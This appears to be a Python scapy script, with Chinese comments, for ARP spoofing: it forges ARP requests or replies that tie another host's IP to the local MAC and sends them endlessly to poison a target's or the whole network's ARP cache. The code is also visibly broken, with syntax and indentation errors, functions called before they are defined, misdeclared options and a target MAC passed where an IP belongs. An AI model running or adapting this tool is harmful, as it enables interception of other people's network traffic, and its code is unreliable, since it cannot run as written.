#!/usr/bin/python3

# -*- coding: UTF-8 -*-

import sys
import os
import time
from optparse import OptionParser
from scapy.all import *

def main():
        '''
        ARP的5个参数
                op:             取值为1或者2，代表ARP请求或者响应包。
                hwsrc:      发送方Mac地址。
                psrc:        发送方IP地址。
                hwdst:      目标Mac地址。
                pdst:        目标IP地址。
        '''
        try:
                if os.geteuid() != 0:
                        print("[-] 请以root权限运行本程序")
                        sys.exit(1)
        except Exception as e:
                print(e)

        usage = 'Usage : %prog [-i interface] [-t target] host'
        parser=OptionParser(usage)
        parser.add_option('-i',dest='interface' ,help='请指定网卡',action='store_true')
        parser.add_option('-t',dest='target' ,help='请指定要欺骗的目标主机',action='store_true')
        parser.add_option('-m',dest='mode' ,help='毒化模式: requests (req) or replies (rep) [default: %default]',action='store_true')
        parser.add_option('-s', action='store_true', dest='summary', default=False, help='显示数据包发送信息')
        (options, args)= parser.parse_args()
        if  len(args) != 0 or options.interface is None:
                parser.print_help()
                sys.exit(0)
       
        mac=get_if_hwaddr(options.interface)
        print('本机mac地址是: %s' %(mac))

        # 处理参数
        if options.mode=='rep':
                pkt=build_rep()
        elif options.mode=='req':
                pkt=build_req():

        if options.summary is True:
                pkt.show()
                 ans = input('\n[*] 是否继续? [Y|n]: ').lower()
                if ans == 'y' or len(ans)==0:
                        pass
                else:
                        sys.exit(0)


        def build_req():# 构造请求数据包
                if options.target is None:
                        pkt=Ether(src=mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=mac,psrc=args[0],pdst=args[0])
               else:
                       target_mac=getmacbyip(options.target)
                       if target_mac is None:
                               print("[-] Error: 无法获取目标ip的mac地址")
                                sys.exit(1)        
                        pkt=Ether(src=mac, dst=target_mac)/ARP(hwsrc=mac,psrc=args[0],hwdst=target_mac,pdst=target_mac)
                return pkt


        def build_rep():# 构造响应数据包
                if options.target is None:
                        pkt=Ether(src=mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=mac,psrc=args[0],pdst=args[0],op=2)
               else:
                       target_mac=getmacbyip(options.target)
                       if target_mac is None:
                               print("[-] Error: 无法获取目标ip的mac地址")
                                sys.exit(1)        
                        pkt=Ether(src=mac, dst=target_mac)/ARP(hwsrc=mac,psrc=args[0],hwdst=target_mac,pdst=target_mac,op=2)
                return pkt

        while True:
                sendp(pkt,inter=2,iface=options.interface)

if  __name__ =="__main__":
        main()